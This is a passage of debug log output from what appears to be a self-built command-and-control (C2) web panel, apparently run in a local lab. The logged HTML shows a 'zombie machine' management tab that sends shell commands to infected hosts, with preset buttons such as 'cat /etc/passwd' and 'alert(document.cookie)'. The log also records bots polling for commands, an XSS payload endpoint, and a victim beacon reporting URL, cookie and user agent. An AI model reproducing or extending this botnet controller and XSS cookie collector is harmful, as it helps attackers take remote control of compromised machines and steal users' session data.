alert(\'請選擇殭屍機器並輸入命令\');\n            return;\n        }\n\n        try {\n            const formData = new FormData();\n            formData.append(\'command\', command);\n\n            const response = await fetch(`/api/control/add_command_to_do/${zombieIp}`, {\n                method: \'POST\',\n                body: formData\n            });\n\n            if (response.ok) {\n                alert(`命令已發送給 ${zombieIp}`);\n                hideCommandForm();\n            } else {\n                const errorData = await response.json();\n                alert(`發送失敗: ${errorData.error}`);\n            }\n        } catch (error) {\n            console.error(\'發送命令失敗:\', error);\n            alert(\'發送命令時發生網路錯誤\');\n        }\n    });\n\n    // 刷新殭屍列表\n    document.getElementById(\'refresh-zombies\').addEventListener(\'click\', loadZombies);\n\n    // 頁面載入時檢查當前選項卡\n    document.addEventListener(\'DOMContentLoaded\', function () {\n        // 檢查URL參數是否指定了選項卡\n        const urlParams = new URLSearchParams(window.location.search);\n        const tab = urlParams.get(\'tab\');\n        if (tab === \'zombies\') {\n            showTab(\'zombies\');\n        }\n    });\n</script>\n\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n    </body>\n    \n</html>'
2025-06-26 21:47:11 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:47:11] "GET /api/control/get_messages HTTP/1.1" 200 -
2025-06-26 21:47:17 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 21:47:17 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 21:47:17 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 39 bytes [200 OK]>
2025-06-26 21:47:17 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:47:17] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 21:47:18 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:47:18] "[33mPOST /api/control/send_result HTTP/1.1[0m" 404 -
2025-06-26 21:47:21 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 21:47:21 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 21:47:21 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 39 bytes [200 OK]>
2025-06-26 21:47:21 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:47:21] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 21:47:24 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:47:24] "[33mPOST /api/control/send_result HTTP/1.1[0m" 404 -
2025-06-26 21:47:27 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 21:47:27 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 21:47:27 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 39 bytes [200 OK]>
2025-06-26 21:47:27 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:47:27] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 21:47:28 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:47:28] "[33mPOST /api/control/send_result HTTP/1.1[0m" 404 -
2025-06-26 21:47:31 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 21:47:31 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 21:47:31 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 39 bytes [200 OK]>
2025-06-26 21:47:31 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:47:31] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 21:47:34 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:47:34] "[33mGET /api/control/send_result HTTP/1.1[0m" 404 -
2025-06-26 21:47:34 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:47:34] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-26 21:47:54 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-26 21:47:54 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-26 21:47:54 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-26 21:47:54 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-26 21:47:54 | INFO     | app.py:217 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-26 21:47:54 | INFO     | app.py:217 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-26 21:47:54 | INFO     | app.py:231 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-26 21:47:54 | INFO     | app.py:231 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-26 21:47:54 | INFO     | start_flaresolverr.py:77 | start_flaresolverr() | 正在啟動 FlareSolverr: /home/hacker/Desktop/share/C2/tools/FlareSolverr/src/flaresolverr.py
2025-06-26 21:48:24 | ERROR    | start_flaresolverr.py:122 | start_flaresolverr() | FlareSolverr 啟動超時
2025-06-26 21:48:24 | INFO     | start_flaresolverr.py:249 | stop_monitoring() | FlareSolverr 監控已停止
2025-06-26 21:48:24 | INFO     | start_flaresolverr.py:148 | stop_flaresolverr() | 正在停止 FlareSolverr 進程 (PID: 15832)
2025-06-26 21:48:24 | INFO     | start_flaresolverr.py:158 | stop_flaresolverr() | FlareSolverr 已停止
2025-06-26 21:48:24 | WARNING  | app.py:236 | create_app() | ⚠️ FlareSolverr 服務啟動失敗，但應用將繼續運行
2025-06-26 21:48:24 | WARNING  | app.py:236 | create_app() | ⚠️ FlareSolverr 服務啟動失敗，但應用將繼續運行
2025-06-26 21:48:24 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-26 21:48:24 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-26 21:48:24 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-26 21:48:24 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-26 21:48:24 | INFO     | app.py:217 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-26 21:48:24 | INFO     | app.py:217 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-26 21:48:24 | INFO     | app.py:231 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-26 21:48:24 | INFO     | app.py:231 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-26 21:48:24 | INFO     | start_flaresolverr.py:77 | start_flaresolverr() | 正在啟動 FlareSolverr: /home/hacker/Desktop/share/C2/tools/FlareSolverr/src/flaresolverr.py
2025-06-26 21:48:54 | ERROR    | start_flaresolverr.py:122 | start_flaresolverr() | FlareSolverr 啟動超時
2025-06-26 21:48:54 | INFO     | start_flaresolverr.py:249 | stop_monitoring() | FlareSolverr 監控已停止
2025-06-26 21:48:54 | INFO     | start_flaresolverr.py:148 | stop_flaresolverr() | 正在停止 FlareSolverr 進程 (PID: 16112)
2025-06-26 21:48:54 | INFO     | start_flaresolverr.py:158 | stop_flaresolverr() | FlareSolverr 已停止
2025-06-26 21:48:54 | WARNING  | app.py:236 | create_app() | ⚠️ FlareSolverr 服務啟動失敗，但應用將繼續運行
2025-06-26 21:48:54 | WARNING  | app.py:236 | create_app() | ⚠️ FlareSolverr 服務啟動失敗，但應用將繼續運行
2025-06-26 21:48:54 | INFO     | _internal.py:97 | _log() | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:8964
2025-06-26 21:48:54 | INFO     | _internal.py:97 | _log() | [33mPress CTRL+C to quit[0m
2025-06-26 21:59:51 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-26 21:59:51 | INFO     | control_route.py:71 | get_messages() | 用戶請求獲取消息
2025-06-26 21:59:51 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0302s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>控制消息</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        \n\n        \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    \n\n    <!-- 選項卡導航 -->\n    <div class="tab-navigation">\n        <button class="tab-btn active" onclick="showTab(\'messages\')">📨 控制消息</button>\n        <button class="tab-btn" onclick="showTab(\'zombies\')">🧟 殭屍管理</button>\n    </div>\n\n    <!-- 控制消息選項卡 -->\n    <div id="messages-tab" class="tab-content active">\n        <h2>控制消息</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n        <form method="post" action="/api/control/add_message">\n            <div class="form-group">\n                <label class="form-label" for="message">控制消息</label>\n                <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n            </div>\n            <div class="form-group">\n                <label class="form-label" for="target_ip">目標IP地址</label>\n                <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n            </div>\n            <button type="submit">發送消息</button>\n        </form>\n    </div>\n\n    <!-- 殭屍管理選項卡 -->\n    <div id="zombies-tab" class="tab-content">\n        <h2>殭屍機器管理</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">管理已連接的殭屍機器並發送命令</p>\n\n        <!-- 殭屍機器列表 -->\n        <div class="zombie-controls">\n            <button id="refresh-zombies" class="refresh-btn">🔄 刷新殭屍列表</button>\n            <div id="zombie-count" class="zombie-count">載入中...</div>\n        </div>\n\n        <div id="zombie-list" class="zombie-list">\n            <!-- 殭屍機器將通過JavaScript動態載入 -->\n        </div>\n\n        <!-- 命令發送表單 -->\n        <div class="command-form-container" style="display: none;" id="command-form-container">\n            <h3>發送命令給殭屍機器</h3>\n            <form id="command-form">\n                <div class="form-group">\n                    <label class="form-label" for="selected-zombie">選中的殭屍機器</label>\n                    <input type="text" id="selected-zombie" readonly>\n                </div>\n                <div class="form-group">\n                    <label class="form-label" for="command">執行命令</label>\n                    <input type="text" id="command" name="command" placeholder="輸入要執行的命令" required>\n                </div>\n                <div class="form-group">\n                    <label class="form-label">常用命令</label>\n                    <div class="quick-commands">\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'whoami\')">whoami</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'pwd\')">pwd</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ls -la\')">ls -la</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ps aux\')">ps aux</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'netstat -tuln\')">netstat</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'uname -a\')">uname -a</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'df -h\')">df -h</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'cat /etc/passwd\')">查看用戶</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'alert(document.cookie)\')">查看cookie</button>\n                    </div>\n                </div>\n                <button type="submit">💀 發送命令</button>\n                <button type="button" onclick="hideCommandForm()">取消</button>\n            </form>\n        </div>\n    </div>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        <div class="empty-state">\n            目前沒有任何消息\n        </div>\n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n<script>\n    // 選項卡切換功能\n    function showTab(tabName) {\n        // 隱藏所有選項卡內容\n        const tabContents = document.querySelectorAll(\'.tab-content\');\n        tabContents.forEach(tab => {\n            tab.classList.remove(\'active\');\n        });\n\n        // 移除所有選項卡按鈕的活動狀態\n        const tabBtns = document.querySelectorAll(\'.tab-btn\');\n        tabBtns.forEach(btn => {\n            btn.classList.remove(\'active\');\n        });\n\n        // 顯示選中的選項卡\n        document.getElementById(tabName + \'-tab\').classList.add(\'active\');\n        event.target.classList.add(\'active\');\n\n        // 如果切換到殭屍管理選項卡，自動載入殭屍列表\n        if (tabName === \'zombies\') {\n            loadZombies();\n        }\n    }\n\n    // 載入殭屍機器列表\n    async function loadZombies() {\n        try {\n            const response = await fetch(\'/api/control/get_zombies\');\n            const data = await response.json();\n\n            const zombieCountEl = document.getElementById(\'zombie-count\');\n            const zombieListEl = document.getElementById(\'zombie-list\');\n\n            if (data.status === \'success\') {\n                zombieCountEl.textContent = `找到 ${data.count} 台殭屍機器`;\n\n                if (data.zombies.length === 0) {\n                    zombieListEl.innerHTML = \'<div class="empty-state">目前沒有連接的殭屍機器</div>\';\n                } else {\n                    let zombieHtml = \'\';\n                    data.zombies.forEach(zombie => {\n                        zombieHtml += `\n                        <div class="zombie-card" onclick="selectZombie(\'${zombie}\')">\n                            <div class="zombie-info">\n                                <h4>🧟 ${zombie}</h4>\n                                <p>點擊選擇此殭屍機器</p>\n                            </div>\n                            <div class="zombie-actions">\n                                <button class="action-btn" onclick="event.stopPropagation(); selectZombie(\'${zombie}\')">\n                                    💀 發送命令\n                                </button>\n                            </div>\n                        </div>\n                    `;\n                    });\n                    zombieListEl.innerHTML = zombieHtml;\n                }\n            } else {\n                zombieCountEl.textContent = \'載入失敗\';\n                zombieListEl.innerHTML = `<div class="error-state">載入失敗: ${data.error}</div>`;\n            }\n        } catch (error) {\n            console.error(\'載入殭屍列表失敗:\', error);\n            document.getElementById(\'zombie-count\').textContent = \'載入失敗\';\n            document.getElementById(\'zombie-list\').innerHTML = \'<div class="error-state">網路錯誤</div>\';\n        }\n    }\n\n    // 選擇殭屍機器\n    function selectZombie(zombieIp) {\n        document.getElementById(\'selected-zombie\').value = zombieIp;\n        document.getElementById(\'command-form-container\').style.display = \'block\';\n        document.getElementById(\'command\').focus();\n    }\n\n    // 隱藏命令表單\n    function hideCommandForm() {\n        document.getElementById(\'command-form-container\').style.display = \'none\';\n        document.getElementById(\'command\').value = \'\';\n        document.getElementById(\'selected-zombie\').value = \'\';\n    }\n\n    // 設置快速命令\n    function setCommand(cmd) {\n        document.getElementById(\'command\').value = cmd;\n    }\n\n    // 發送命令給殭屍機器\n    document.getElementById(\'command-form\').addEventListener(\'submit\', async function (e) {\n        e.preventDefault();\n\n        const zombieIp = document.getElementById(\'selected-zombie\').value;\n        const command = document.getElementById(\'command\').value;\n\n        if (!zombieIp || !command) {\n            alert(\'請選擇殭屍機器並輸入命令\');\n            return;\n        }\n\n        try {\n            const formData = new FormData();\n            formData.append(\'command\', command);\n\n            const response = await fetch(`/api/control/add_command_to_do/${zombieIp}`, {\n                method: \'POST\',\n                body: formData\n            });\n\n            if (response.ok) {\n                alert(`命令已發送給 ${zombieIp}`);\n                hideCommandForm();\n            } else {\n                const errorData = await response.json();\n                alert(`發送失敗: ${errorData.error}`);\n            }\n        } catch (error) {\n            console.error(\'發送命令失敗:\', error);\n            alert(\'發送命令時發生網路錯誤\');\n        }\n    });\n\n    // 刷新殭屍列表\n    document.getElementById(\'refresh-zombies\').addEventListener(\'click\', loadZombies);\n\n    // 頁面載入時檢查當前選項卡\n    document.addEventListener(\'DOMContentLoaded\', function () {\n        // 檢查URL參數是否指定了選項卡\n        const urlParams = new URLSearchParams(window.location.search);\n        const tab = urlParams.get(\'tab\');\n        if (tab === \'zombies\') {\n            showTab(\'zombies\');\n        }\n    });\n</script>\n\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n    </body>\n    \n</html>'
2025-06-26 21:59:51 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:59:51] "GET /api/control/get_messages?tab=zombies HTTP/1.1" 200 -
2025-06-26 21:59:51 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:59:51] "[36mGET /static/css/control_message.css HTTP/1.1[0m" 304 -
2025-06-26 21:59:51 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:59:51] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-26 21:59:56 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:59:56] "[31m[1mGET /api/control/send_result HTTP/1.1[0m" 405 -
2025-06-26 21:59:56 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:59:56] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-26 21:59:59 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 xss_payload()
2025-06-26 21:59:59 | INFO     | control_route.py:125 | xss_payload() | 用戶請求XSS載荷文件
2025-06-26 21:59:59 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] xss_payload 執行完畢 (耗時: 0.0003s) -> 回傳: <Response 4313 bytes [200 OK]>
2025-06-26 21:59:59 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:59:59] "GET /api/control/xss_payload HTTP/1.1" 200 -
2025-06-26 21:59:59 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-26 21:59:59 | INFO     | control_route.py:18 | add_message() | 用戶請求添加消息 (POST)
2025-06-26 21:59:59 | INFO     | control_route.py:41 | add_message() | 消息添加成功，目標IP: 127.0.0.1,消息: {"where":"http://127.0.0.1:8000/","hostname":"127.0.0.1","cookie":"","user_agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36","time_stamp":"2025-06-26T13:59:59.791Z"},時間: 2025-06-26 21:59:59.798174
2025-06-26 21:59:59 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0057s) -> 回傳: <Response 237 bytes [302 FOUND]>
2025-06-26 21:59:59 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:59:59] "[32mPOST /api/control/add_message HTTP/1.1[0m" 302 -
2025-06-26 21:59:59 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-26 21:59:59 | INFO     | control_route.py:71 | get_messages() | 用戶請求獲取消息
2025-06-26 21:59:59 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0010s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>控制消息</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        \n\n        \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    \n\n    <!-- 選項卡導航 -->\n    <div class="tab-navigation">\n        <button class="tab-btn active" onclick="showTab(\'messages\')">📨 控制消息</button>\n        <button class="tab-btn" onclick="showTab(\'zombies\')">🧟 殭屍管理</button>\n    </div>\n\n    <!-- 控制消息選項卡 -->\n    <div id="messages-tab" class="tab-content active">\n        <h2>控制消息</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n        <form method="post" action="/api/control/add_message">\n            <div class="form-group">\n                <label class="form-label" for="message">控制消息</label>\n                <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n            </div>\n            <div class="form-group">\n                <label class="form-label" for="target_ip">目標IP地址</label>\n                <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n            </div>\n            <button type="submit">發送消息</button>\n        </form>\n    </div>\n\n    <!-- 殭屍管理選項卡 -->\n    <div id="zombies-tab" class="tab-content">\n        <h2>殭屍機器管理</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">管理已連接的殭屍機器並發送命令</p>\n\n        <!-- 殭屍機器列表 -->\n        <div class="zombie-controls">\n            <button id="refresh-zombies" class="refresh-btn">🔄 刷新殭屍列表</button>\n            <div id="zombie-count" class="zombie-count">載入中...</div>\n        </div>\n\n        <div id="zombie-list" class="zombie-list">\n            <!-- 殭屍機器將通過JavaScript動態載入 -->\n        </div>\n\n        <!-- 命令發送表單 -->\n        <div class="command-form-container" style="display: none;" id="command-form-container">\n            <h3>發送命令給殭屍機器</h3>\n            <form id="command-form">\n                <div class="form-group">\n                    <label class="form-label" for="selected-zombie">選中的殭屍機器</label>\n                    <input type="text" id="selected-zombie" readonly>\n                </div>\n                <div class="form-group">\n                    <label class="form-label" for="command">執行命令</label>\n                    <input type="text" id="command" name="command" placeholder="輸入要執行的命令" required>\n                </div>\n                <div class="form-group">\n                    <label class="form-label">常用命令</label>\n                    <div class="quick-commands">\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'whoami\')">whoami</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'pwd\')">pwd</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ls -la\')">ls -la</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ps aux\')">ps aux</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'netstat -tuln\')">netstat</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'uname -a\')">uname -a</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'df -h\')">df -h</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'cat /etc/passwd\')">查看用戶</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'alert(document.cookie)\')">查看cookie</button>\n                    </div>\n                </div>\n                <button type="submit">💀 發送命令</button>\n                <button type="button" onclick="hideCommandForm()">取消</button>\n            </form>\n        </div>\n    </div>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        \n        <div class="message">\n            <p><strong>目標IP:</strong> 127.0.0.1</p>\n            <p><strong>目標配置:</strong> {&#34;where&#34;:&#34;http://127.0.0.1:8000/&#34;,&#34;hostname&#34;:&#34;127.0.0.1&#34;,&#34;cookie&#34;:&#34;&#34;,&#34;user_agent&#34;:&#34;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36&#34;,&#34;time_stamp&#34;:&#34;2025-06-26T13:59:59.791Z&#34;}</p>\n            <p><strong>建立時間:</strong> 2025-06-26 21:59:59.793637</p>\n        </div>\n        \n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n<script>\n    // 選項卡切換功能\n    function showTab(tabName) {\n        // 隱藏所有選項卡內容\n        const tabContents = document.querySelectorAll(\'.tab-content\');\n        tabContents.forEach(tab => {\n            tab.classList.remove(\'active\');\n        });\n\n        // 移除所有選項卡按鈕的活動狀態\n        const tabBtns = document.querySelectorAll(\'.tab-btn\');\n        tabBtns.forEach(btn => {\n            btn.classList.remove(\'active\');\n        });\n\n        // 顯示選中的選項卡\n        document.getElementById(tabName + \'-tab\').classList.add(\'active\');\n        event.target.classList.add(\'active\');\n\n        // 如果切換到殭屍管理選項卡，自動載入殭屍列表\n        if (tabName === \'zombies\') {\n            loadZombies();\n        }\n    }\n\n    // 載入殭屍機器列表\n    async function loadZombies() {\n        try {\n            const response = await fetch(\'/api/control/get_zombies\');\n            const data = await response.json();\n\n            const zombieCountEl = document.getElementById(\'zombie-count\');\n            const zombieListEl = document.getElementById(\'zombie-list\');\n\n            if (data.status === \'success\') {\n                zombieCountEl.textContent = `找到 ${data.count} 台殭屍機器`;\n\n                if (data.zombies.length === 0) {\n                    zombieListEl.innerHTML = \'<div class="empty-state">目前沒有連接的殭屍機器</div>\';\n                } else {\n                    let zombieHtml = \'\';\n                    data.zombies.forEach(zombie => {\n                        zombieHtml += `\n                        <div class="zombie-card" onclick="selectZombie(\'${zombie}\')">\n                            <div class="zombie-info">\n                                <h4>🧟 ${zombie}</h4>\n                                <p>點擊選擇此殭屍機器</p>\n                            </div>\n                            <div class="zombie-actions">\n                                <button class="action-btn" onclick="event.stopPropagation(); selectZombie(\'${zombie}\')">\n                                    💀 發送命令\n                                </button>\n                            </div>\n                        </div>\n                    `;\n                    });\n                    zombieListEl.innerHTML = zombieHtml;\n                }\n            } else {\n                zombieCountEl.textContent = \'載入失敗\';\n                zombieListEl.innerHTML = `<div class="error-state">載入失敗: ${data.error}</div>`;\n            }\n        } catch (error) {\n            console.error(\'載入殭屍列表失敗:\', error);\n            document.getElementById(\'zombie-count\').textContent = \'載入失敗\';\n            document.getElementById(\'zombie-list\').innerHTML = \'<div class="error-state">網路錯誤</div>\';\n        }\n    }\n\n    // 選擇殭屍機器\n    function selectZombie(zombieIp) {\n        document.getElementById(\'selected-zombie\').value = zombieIp;\n        document.getElementById(\'command-form-container\').style.display = \'block\';\n        document.getElementById(\'command\').focus();\n    }\n\n    // 隱藏命令表單\n    function hideCommandForm() {\n        document.getElementById(\'command-form-container\').style.display = \'none\';\n        document.getElementById(\'command\').value = \'\';\n        document.getElementById(\'selected-zombie\').value = \'\';\n    }\n\n    // 設置快速命令\n    function setCommand(cmd) {\n        document.getElementById(\'command\').value = cmd;\n    }\n\n    // 發送命令給殭屍機器\n    document.getElementById(\'command-form\').addEventListener(\'submit\', async function (e) {\n        e.preventDefault();\n\n        const zombieIp = document.getElementById(\'selected-zombie\').value;\n        const command = document.getElementById(\'command\').value;\n\n        if (!zombieIp || !command) {\n            alert(\'請選擇殭屍機器並輸入命令\');\n            return;\n        }\n\n        try {\n            const formData = new FormData();\n            formData.append(\'command\', command);\n\n            const response = await fetch(`/api/control/add_command_to_do/${zombieIp}`, {\n                method: \'POST\',\n                body: formData\n            });\n\n            if (response.ok) {\n                alert(`命令已發送給 ${zombieIp}`);\n                hideCommandForm();\n            } else {\n                const errorData = await response.json();\n                alert(`發送失敗: ${errorData.error}`);\n            }\n        } catch (error) {\n            console.error(\'發送命令失敗:\', error);\n            alert(\'發送命令時發生網路錯誤\');\n        }\n    });\n\n    // 刷新殭屍列表\n    document.getElementById(\'refresh-zombies\').addEventListener(\'click\', loadZombies);\n\n    // 頁面載入時檢查當前選項卡\n    document.addEventListener(\'DOMContentLoaded\', function () {\n        // 檢查URL參數是否指定了選項卡\n        const urlParams = new URLSearchParams(window.location.search);\n        const tab = urlParams.get(\'tab\');\n        if (tab === \'zombies\') {\n            showTab(\'zombies\');\n        }\n    });\n</script>\n\n\n\n        <!-- JavaScript 引用 